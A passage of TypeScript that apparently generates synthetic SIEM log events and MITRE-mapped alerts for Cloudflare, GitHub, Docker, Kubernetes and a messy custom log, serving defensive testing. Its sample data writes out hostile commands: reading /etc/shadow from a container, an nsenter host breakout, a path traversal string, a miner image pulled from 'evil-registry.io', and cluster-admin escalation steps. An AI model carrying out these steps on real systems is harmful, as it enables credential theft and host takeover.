    { action: "block", ruleId: "100009", ruleMsg: "Command injection in header", uri: "/api/health", method: "GET", botScore: 0, category: "rce" },
    { action: "allow", ruleId: "", ruleMsg: "", uri: "/dashboard", method: "GET", botScore: 95, category: "legitimate" },
  ];

  for (let i = 0; i < count; i++) {
    const ts = minutesAgo(count - i);
    const evt = wafEvents[i % wafEvents.length];
    const ip = evt.category === "legitimate" ? legitimateIp : attackerIps[i % attackerIps.length];
    docs.push({
      _index: "logs-cloudflare.logpush-default",
      _source: {
        ...baseEvent(ts),
        event: { action: evt.action, category: ["web", "network"], type: ["access"], kind: "event", dataset: "cloudflare.logpush", module: "cloudflare", outcome: evt.action === "allow" ? "success" : "failure" },
        source: { ip, geo: { country_iso_code: evt.category === "legitimate" ? "US" : "RU" } },
        destination: { domain: targetDomain },
        url: { original: evt.uri, path: evt.uri.split("?")[0], domain: targetDomain },
        http: { request: { method: evt.method }, response: { status_code: evt.action === "block" ? 403 : evt.action === "drop" ? 0 : 200 } },
        user_agent: { original: evt.category === "legitimate" ? "Mozilla/5.0 Chrome/120" : `python-requests/2.31 (bot-${evt.category})` },
        cloudflare: {
          action: evt.action,
          rule_id: evt.ruleId || undefined,
          rule_message: evt.ruleMsg || undefined,
          bot: { score: evt.botScore, verified: false },
          edge: { rate_limit: evt.category === "ddos" || evt.category === "rate-limit" },
          ray_id: crypto.randomUUID().replace(/-/g, "").slice(0, 16),
          zone: { name: targetDomain },
        },
      },
    });
  }

  docs.push(alert(minutesAgo(count - 2), {
    ruleName: "Cloudflare - SQL Injection Blocked", dataset: "cloudflare.logpush", severity: "high", riskScore: 72,
    reason: `SQL injection attempt blocked on ${targetDomain}/api/users from ${attackerIps[0]}`,
    threat: [mitre("TA0001", "Initial Access", "T1190", "Exploit Public-Facing Application")],
    extra: { source: { ip: attackerIps[0] }, url: { domain: targetDomain } },
  }));

  docs.push(alert(minutesAgo(count - 4), {
    ruleName: "Cloudflare - Credential Stuffing Attack", dataset: "cloudflare.logpush", severity: "high", riskScore: 78,
    reason: `Credential stuffing on ${targetDomain}/auth/login — ${count} attempts from ${attackerIps[1]}`,
    threat: [mitre("TA0006", "Credential Access", "T1110.004", "Credential Stuffing")],
    extra: { source: { ip: attackerIps[1] }, url: { domain: targetDomain } },
  }));

  docs.push(alert(minutesAgo(8), {
    ruleName: "Cloudflare - DDoS Attack Mitigated", dataset: "cloudflare.logpush", severity: "high", riskScore: 80,
    reason: `L7 DDoS flood mitigated on ${targetDomain} — traffic dropped from multiple IPs`,
    threat: [mitre("TA0040", "Impact", "T1498", "Network Denial of Service")],
    extra: { source: { ip: attackerIps[2] }, url: { domain: targetDomain } },
  }));

  docs.push(alert(minutesAgo(4), {
    ruleName: "Cloudflare - Path Traversal Attempt", dataset: "cloudflare.logpush", severity: "high", riskScore: 75,
    reason: `Directory traversal ../../etc/passwd blocked on ${targetDomain} from ${attackerIps[0]}`,
    threat: [mitre("TA0001", "Initial Access", "T1190", "Exploit Public-Facing Application")],
    extra: { source: { ip: attackerIps[0] }, url: { domain: targetDomain } },
  }));

  return docs;
}

// --- GitHub Audit Events ---

function generateGithubAuditEvents(count: number): IndexedDoc[] {
  const docs: IndexedDoc[] = [];
  const org = "acmecorp";
  const attackerIp = randomIp();
  const legitimateIp = "198.51.100.10";
  const compromisedUser = "dev-contractor-42";
  const adminUser = "platform-admin";

  const auditActions = [
    { action: "repo.create", actor: compromisedUser, repo: `${org}/internal-tools`, detail: "Private repository created" },
    { action: "repo.access", actor: compromisedUser, repo: `${org}/payment-service`, detail: "Repository visibility changed to public", visibility: "public" },
    { action: "deploy_key.create", actor: compromisedUser, repo: `${org}/payment-service`, detail: "Deploy key with write access added" },
    { action: "org.invite_member", actor: compromisedUser, repo: "", detail: "External user invited with admin role", permission: "admin", targetUser: "malicious-actor-x" },
    { action: "secret_scanning_alert.dismiss", actor: compromisedUser, repo: `${org}/payment-service`, detail: "Secret scanning alert dismissed as false positive" },
    { action: "protected_branch.policy_override", actor: compromisedUser, repo: `${org}/payment-service`, detail: "Branch protection bypassed for direct push to main" },
    { action: "workflows.completed", actor: compromisedUser, repo: `${org}/payment-service`, detail: "CI workflow dispatched from fork", actorType: "fork" },
    { action: "org.update_member", actor: adminUser, repo: "", detail: "Member role changed to owner", permission: "owner" },
    { action: "personal_access_token.create", actor: compromisedUser, repo: "", detail: "Fine-grained PAT created with repo+admin scope" },
    { action: "repo.download_zip", actor: compromisedUser, repo: `${org}/infrastructure-as-code`, detail: "Repository archive downloaded" },
  ];

  for (let i = 0; i < count; i++) {
    const ts = minutesAgo(count - i);
    const action = auditActions[i % auditActions.length];
    const ip = action.actor === adminUser ? legitimateIp : attackerIp;
    docs.push({
      _index: "logs-github.audit-default",
      _source: {
        ...baseEvent(ts),
        event: { action: action.action, category: ["configuration"], type: ["change"], kind: "event", dataset: "github.audit", module: "github", outcome: "success" },
        source: { ip },
        user: { name: action.actor, target: action.targetUser ? { name: action.targetUser } : undefined },
        organization: { name: org },
        github: {
          actor: action.actor,
          actor_type: action.actorType || "user",
          org: org,
          repo: action.repo || undefined,
          visibility: action.visibility || undefined,
          permission: action.permission || undefined,
          action: action.action,
        },
        message: action.detail,
      },
    });
  }

  docs.push(alert(minutesAgo(count - 2), {
    ruleName: "GitHub - Repository Visibility Changed to Public", dataset: "github.audit", severity: "critical", riskScore: 92,
    reason: `${compromisedUser} changed ${org}/payment-service to public — source code exposure`,
    threat: [mitre("TA0010", "Exfiltration", "T1567", "Exfiltration Over Web Service")],
    extra: { user: { name: compromisedUser }, source: { ip: attackerIp }, github: { repo: `${org}/payment-service` } },
  }));

  docs.push(alert(minutesAgo(count - 4), {
    ruleName: "GitHub - Deploy Key Added to Repository", dataset: "github.audit", severity: "high", riskScore: 75,
    reason: `Deploy key with write access added to ${org}/payment-service by ${compromisedUser}`,
    threat: [mitre("TA0003", "Persistence", "T1098.001", "Additional Cloud Credentials")],
    extra: { user: { name: compromisedUser }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(count - 6), {
    ruleName: "GitHub - Organization Member Invited with Admin Role", dataset: "github.audit", severity: "high", riskScore: 80,
    reason: `${compromisedUser} invited malicious-actor-x to ${org} with admin role`,
    threat: [mitre("TA0004", "Privilege Escalation", "T1098.003", "Additional Cloud Roles")],
    extra: { user: { name: compromisedUser }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(6), {
    ruleName: "GitHub - Secrets Scanning Alert Dismissed", dataset: "github.audit", severity: "high", riskScore: 72,
    reason: `Secret scanning alert on ${org}/payment-service dismissed by ${compromisedUser} — possible cover-up`,
    threat: [mitre("TA0005", "Defense Evasion", "T1562.001", "Disable or Modify Tools")],
    extra: { user: { name: compromisedUser }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(2), {
    ruleName: "GitHub - Workflow Dispatch from Fork", dataset: "github.audit", severity: "high", riskScore: 78,
    reason: `CI workflow triggered from fork on ${org}/payment-service — supply chain risk`,
    threat: [mitre("TA0001", "Initial Access", "T1195.002", "Compromise Software Supply Chain")],
    extra: { user: { name: compromisedUser }, source: { ip: attackerIp } },
  }));

  return docs;
}

// --- Docker Container Events ---

function generateDockerContainerEvents(count: number): IndexedDoc[] {
  const docs: IndexedDoc[] = [];
  const host = { name: "docker-host-prod-01", os: { name: "Ubuntu 22.04", platform: "linux" } };
  const attackerImage = "evil-registry.io/crypto-miner:latest";
  const legitimateImage = "docker.io/nginx:1.25";

  const containerEvents = [
    { action: "pull", type: "image", name: legitimateImage, attrs: { name: legitimateImage } },
    { action: "create", type: "container", name: "web-frontend", attrs: { image: legitimateImage, name: "web-frontend" } },
    { action: "start", type: "container", name: "web-frontend", attrs: { image: legitimateImage, name: "web-frontend" } },
    { action: "pull", type: "image", name: attackerImage, attrs: { name: attackerImage } },
    { action: "create", type: "container", name: "system-monitor", attrs: { image: attackerImage, name: "system-monitor", privileged: "true", binds: "/:/host:rw", network_mode: "host" } },
    { action: "start", type: "container", name: "system-monitor", attrs: { image: attackerImage, name: "system-monitor", privileged: "true" } },
    { action: "exec_create", type: "container", name: "system-monitor", attrs: { image: attackerImage, execCommand: "/bin/sh -c 'cat /host/etc/shadow'", user: "root" } },
    { action: "exec_start", type: "container", name: "system-monitor", attrs: { image: attackerImage, execCommand: "nsenter --target 1 --mount --uts --ipc --net --pid", user: "root" } },
    { action: "connect", type: "network", name: "system-monitor", attrs: { network: "host", container: "system-monitor" } },
    { action: "die", type: "container", name: "web-frontend", attrs: { image: legitimateImage, exitCode: "137", name: "web-frontend" } },
  ];

  for (let i = 0; i < count; i++) {
    const ts = minutesAgo(count - i);
    const evt = containerEvents[i % containerEvents.length];
    docs.push({
      _index: "logs-docker.events-default",
      _source: {
        ...baseEvent(ts),
        event: { action: evt.action, category: ["process"], type: [evt.action.includes("start") ? "start" : "info"], kind: "event", dataset: "docker.events", module: "docker" },
        host,
        container: { name: evt.name, image: { name: evt.attrs.image || evt.name }, runtime: "docker" },
        docker: { attrs: evt.attrs, type: evt.type },
      },
    });
  }

  docs.push(alert(minutesAgo(count - 4), {
    ruleName: "Docker - Image Pulled from Untrusted Registry", dataset: "docker.events", severity: "high", riskScore: 75,
    reason: `Image ${attackerImage} pulled from untrusted registry on ${host.name}`,
    threat: [mitre("TA0001", "Initial Access", "T1195.002", "Compromise Software Supply Chain")],
    extra: { host, container: { image: { name: attackerImage } } },
  }));

  docs.push(alert(minutesAgo(count - 5), {
    ruleName: "Docker - Privileged Container Started", dataset: "docker.events", severity: "critical", riskScore: 88,
    reason: `Privileged container 'system-monitor' started on ${host.name} with host filesystem mount`,
    threat: [mitre("TA0004", "Privilege Escalation", "T1611", "Escape to Host")],
    extra: { host, container: { name: "system-monitor", image: { name: attackerImage } } },
  }));

  docs.push(alert(minutesAgo(count - 6), {
    ruleName: "Docker - Container Escape via Mount", dataset: "docker.events", severity: "critical", riskScore: 92,
    reason: `Container 'system-monitor' has /:/host:rw mount — full host filesystem access on ${host.name}`,
    threat: [mitre("TA0004", "Privilege Escalation", "T1611", "Escape to Host")],
    extra: { host, container: { name: "system-monitor" } },
  }));

  docs.push(alert(minutesAgo(6), {
    ruleName: "Docker - Container Running as Root", dataset: "docker.events", severity: "high", riskScore: 72,
    reason: "nsenter executed as root in 'system-monitor' — host namespace breakout",
    threat: [mitre("TA0002", "Execution", "T1059", "Command and Scripting Interpreter")],
    extra: { host, container: { name: "system-monitor" } },
  }));

  docs.push(alert(minutesAgo(3), {
    ruleName: "Docker - Network Mode Host Detected", dataset: "docker.events", severity: "high", riskScore: 78,
    reason: `Container 'system-monitor' using host network mode on ${host.name} — unrestricted network access`,
    threat: [mitre("TA0008", "Lateral Movement", "T1021", "Remote Services")],
    extra: { host, container: { name: "system-monitor" } },
  }));

  return docs;
}

// --- Kubernetes Audit Events ---

function generateKubernetesAudit(count: number): IndexedDoc[] {
  const docs: IndexedDoc[] = [];
  const cluster = "prod-us-east-1";
  const attackerSa = "system:serviceaccount:default:compromised-sa";
  const normalSa = "system:serviceaccount:kube-system:kube-scheduler";

  const auditEvents = [
    { verb: "get", resource: "secrets", ns: "production", name: "db-credentials", user: attackerSa, code: 200 },
    { verb: "list", resource: "secrets", ns: "production", name: "", user: attackerSa, code: 200 },
    { verb: "create", resource: "pods", ns: "default", name: "debug-pod", user: attackerSa, code: 201, hostPID: true },
    { verb: "create", resource: "clusterrolebindings", ns: "", name: "escalation-binding", user: attackerSa, code: 201 },
    { verb: "patch", resource: "configmaps", ns: "kube-system", name: "coredns", user: attackerSa, code: 200 },
    { verb: "create", resource: "pods", ns: "default", name: "exec-pod", user: attackerSa, code: 201, subresource: "exec" },
    { verb: "create", resource: "serviceaccounts", ns: "kube-system", name: "backdoor-sa", user: attackerSa, code: 201 },
    { verb: "delete", resource: "events", ns: "default", name: "", user: attackerSa, code: 200 },
    { verb: "get", resource: "nodes", ns: "", name: "worker-node-01", user: normalSa, code: 200 },
    { verb: "update", resource: "deployments", ns: "production", name: "payment-api", user: attackerSa, code: 200 },
  ];

  for (let i = 0; i < count; i++) {
    const ts = minutesAgo(count - i);
    const evt = auditEvents[i % auditEvents.length];
    docs.push({
      _index: "logs-kubernetes.audit-default",
      _source: {
        ...baseEvent(ts),
        event: { action: evt.verb, category: ["configuration"], type: [evt.verb === "create" ? "creation" : evt.verb === "delete" ? "deletion" : "change"], kind: "event", dataset: "kubernetes.audit", module: "kubernetes", outcome: evt.code < 400 ? "success" : "failure" },
        cloud: { provider: "aws", region: "us-east-1" },
        orchestrator: { cluster: { name: cluster }, type: "kubernetes" },
        user: { name: evt.user },
        kubernetes: {
          audit: {
            verb: evt.verb,
            objectRef: { resource: evt.resource, namespace: evt.ns || undefined, name: evt.name || undefined, subresource: evt.subresource || undefined, apiGroup: evt.resource === "clusterrolebindings" ? "rbac.authorization.k8s.io" : "" },
            sourceIPs: [evt.user === normalSa ? "10.0.1.10" : randomIp()],
            responseStatus: { code: evt.code },
            userAgent: "kubectl/v1.29.0",
          },
        },
      },
    });
  }

  docs.push(alert(minutesAgo(count - 1), {
    ruleName: "K8s - Secrets Accessed by Service Account", dataset: "kubernetes.audit", severity: "high", riskScore: 78,
    reason: `${attackerSa} accessed secrets/db-credentials in production namespace`,
    threat: [mitre("TA0006", "Credential Access", "T1552.007", "Container API")],
    extra: { orchestrator: { cluster: { name: cluster } }, user: { name: attackerSa } },
  }));

  docs.push(alert(minutesAgo(count - 3), {
    ruleName: "K8s - Pod Created with hostPID", dataset: "kubernetes.audit", severity: "critical", riskScore: 90,
    reason: `Pod 'debug-pod' created with hostPID=true by ${attackerSa} — host escape vector`,
    threat: [mitre("TA0004", "Privilege Escalation", "T1611", "Escape to Host")],
    extra: { orchestrator: { cluster: { name: cluster } }, user: { name: attackerSa } },
  }));

  docs.push(alert(minutesAgo(count - 4), {
    ruleName: "K8s - ClusterRoleBinding to cluster-admin", dataset: "kubernetes.audit", severity: "critical", riskScore: 95,
    reason: `${attackerSa} created clusterrolebinding 'escalation-binding' to cluster-admin`,
    threat: [mitre("TA0004", "Privilege Escalation", "T1078.001", "Default Accounts")],
    extra: { orchestrator: { cluster: { name: cluster } }, user: { name: attackerSa } },
  }));

  docs.push(alert(minutesAgo(8), {
    ruleName: "K8s - ConfigMap Modified in kube-system", dataset: "kubernetes.audit", severity: "high", riskScore: 72,
    reason: `CoreDNS ConfigMap patched in kube-system by ${attackerSa} — DNS manipulation`,
    threat: [mitre("TA0005", "Defense Evasion", "T1562.001", "Disable or Modify Tools")],
    extra: { orchestrator: { cluster: { name: cluster } }, user: { name: attackerSa } },
  }));

  docs.push(alert(minutesAgo(4), {
    ruleName: "K8s - Exec into Running Pod", dataset: "kubernetes.audit", severity: "medium", riskScore: 55,
    reason: `kubectl exec into pod by ${attackerSa} — container administration command`,
    threat: [mitre("TA0002", "Execution", "T1609", "Container Administration Command")],
    extra: { orchestrator: { cluster: { name: cluster } }, user: { name: attackerSa } },
  }));

  return docs;
}

// --- Messy Custom Log (intentionally inconsistent, realistic real-world ingestion) ---

function generateMessyCustomLog(count: number): IndexedDoc[] {
  const docs: IndexedDoc[] = [];
  const hosts = ["legacy-app-srv", "BILLING_SYS_02", "monitor.internal", "app-node-east-3"];
  const users = ["admin", "svc_account", "root", "SYSTEM", "jdoe@corp.local", undefined];
  const levels = ["info", "INFO", "warn", "WARNING", "error", "ERROR", "debug", "CRITICAL", "fatal", "notice"];

  const messyMessages = [
    { msg: "Connection established to db-primary:5432", extra: { db: { host: "db-primary", port: 5432 }, duration_ms: 23 } },
    { msg: "WARN: disk usage at 94% on /dev/sda1", extra: { disk: { pct: 0.94, path: "/dev/sda1" }, threshold: 0.90 } },
    { msg: "Failed login attempt for user admin from 10.0.99.5", extra: { source_ip: "10.0.99.5", auth: { attempts: 5, locked: false } } },
    { msg: 'ERROR 2024-03-15T08:22:11 NullPointerException at com.acme.billing.PaymentProcessor.processRefund(PaymentProcessor.java:442)', extra: { error: { type: "NullPointerException", stack_trace: "at com.acme.billing.PaymentProcessor.processRefund(PaymentProcessor.java:442)\nat com.acme.billing.RefundService.handle(RefundService.java:88)" } } },
    { msg: "request_id=abc-123 method=POST path=/api/v2/invoice status=500 duration=12842ms bytes=0", extra: { http: { method: "POST", path: "/api/v2/invoice", status: 500 }, response_time_ms: 12842 } },
    { msg: "[ALERT] SSL certificate expires in 3 days for billing.acmecorp.com", extra: { tls: { expiry_days: 3, domain: "billing.acmecorp.com" } } },
    { msg: "User svc_account exported 15,423 records from customer_data table", extra: { db: { table: "customer_data", records: 15423, action: "export" } } },
    { msg: '{"timestamp":"2024-03-15","level":"error","service":"payment-gateway","msg":"upstream timeout after 30s","upstream":"stripe-proxy:8443","correlation_id":"x7k2m9"}', extra: { upstream: "stripe-proxy:8443", timeout_s: 30 } },
    { msg: "cron[8842]: (root) CMD (/opt/scripts/backup.sh --full --encrypt)", extra: { process: { pid: 8842, name: "cron" }, script: "/opt/scripts/backup.sh" } },
    { msg: "Mar 15 08:30:01 legacy-app-srv sshd[12044]: Accepted publickey for admin from 10.0.1.50 port 22 ssh2", extra: { source: { ip: "10.0.1.50" }, process: { name: "sshd", pid: 12044 } } },
    { msg: "OOMKilled: container billing-worker exceeded memory limit 512Mi", extra: { container: { name: "billing-worker", memory_limit: "512Mi" }, kubernetes: { event: "OOMKilled" } } },
    { msg: "tcp        0      0 0.0.0.0:3306     0.0.0.0:*     LISTEN      -", extra: { network: { port: 3306, state: "LISTEN", bind: "0.0.0.0" } } },
    { msg: 'DEPRECATION WARNING: config key "legacy_auth_mode" will be removed in v4.0', extra: { config_key: "legacy_auth_mode", removal_version: "4.0" } },
    { msg: "Segfault at address 0x00007fff2a3b in libcrypto.so.1.1 — core dumped", extra: { error: { type: "SIGSEGV", address: "0x00007fff2a3b", library: "libcrypto.so.1.1" } } },
    { msg: "firewall: DROP IN=eth0 OUT= SRC=185.220.101.42 DST=10.0.5.11 PROTO=TCP DPT=22", extra: { source: { ip: "185.220.101.42" }, destination: { ip: "10.0.5.11", port: 22 }, network: { direction: "inbound" } } },
  ];

  for (let i = 0; i < count; i++) {
    const ts = minutesAgo(count - i);
    const entry = messyMessages[i % messyMessages.length];
    const host = hosts[i % hosts.length];
    const user = users[i % users.length];
    const level = levels[i % levels.length];

    const source: Record<string, unknown> = {
      ...baseEvent(ts),
      event: { dataset: "custom.messy", kind: "event", category: ["host"], original: entry.msg },
      host: { name: host },
      log: { level, logger: i % 3 === 0 ? "syslog" : i % 3 === 1 ? "application" : "json" },
      message: entry.msg,
    };

    if (user) source.user = { name: user };
    if (entry.extra) Object.assign(source, entry.extra);

    // Intentional messiness: some events have flat fields, some nested, some both
    if (i % 4 === 0) source["custom.app_name"] = ["billing-service", "auth-proxy", "data-pipeline", "legacy-monolith"][i % 4];
    if (i % 5 === 0) source["labels"] = { environment: "production", team: "platform", cost_center: "CC-" + (1000 + i) };
    if (i % 7 === 0) source["observer"] = { type: "filebeat", version: "8.12.0" };

    docs.push({ _index: "logs-custom.messy-default", _source: source });
  }

  docs.push(alert(minutesAgo(count - 3), {
    ruleName: "Custom Log - High Error Rate Burst", dataset: "custom.messy", severity: "high", riskScore: 68,
    reason: "Burst of error-level events in custom log stream from legacy-app-srv — potential service degradation",
    threat: [mitre("TA0040", "Impact", "T1499", "Endpoint Denial of Service")],
    extra: { host: { name: "legacy-app-srv" } },
  }));

  docs.push(alert(minutesAgo(8), {
    ruleName: "Custom Log - Anomalous Field Pattern", dataset: "custom.messy", severity: "medium", riskScore: 45,
    reason: "Unexpected field combinations in custom log — inconsistent ingestion or tampered events",
    threat: [mitre("TA0007", "Discovery", "T1082", "System Information Discovery")],
    extra: { host: { name: "BILLING_SYS_02" } },
  }));

  return docs;
}
